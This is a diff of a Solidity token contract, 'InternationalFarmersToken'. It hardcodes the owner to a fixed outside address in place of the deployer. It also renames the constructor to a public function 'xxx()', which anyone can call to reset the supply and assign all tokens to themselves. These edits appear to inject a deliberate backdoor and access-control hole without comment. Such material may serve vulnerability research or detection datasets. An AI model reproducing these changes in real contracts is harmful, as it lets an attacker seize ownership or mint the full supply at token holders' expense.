@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract InternationalFarmersToken at 0x12ac4109b77a74afa0b8ec788230a46ba9ad49bd
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract InternationalFarmersToken at 0x7b7524fdf31b31fa4c1d463f490dcbdc07e63557
 */
 pragma solidity ^0.4.16;
 
@@ -18,7 +18,7 @@ contract Ownable {
   address public owner;
 
   function Ownable() public {
-    owner = msg.sender;
+    owner = 0x909A9F4C71363a7B0ba4478447d841F2eBa8c439;
   }
 
   modifier onlyOwner() {
@@ -94,7 +94,7 @@ contract InternationalFarmersToken is ERC20, SafeMath, Ownable {
   mapping(address => uint) balances;
   mapping (address => mapping (address => uint)) allowed;
 
-  function InternationalFarmersToken() public {
+  function xxx() public {
     initialSupply = 90000000 * 10 ** uint256(decimals);
     totalSupply = initialSupply;
     balances[msg.sender] = totalSupply;
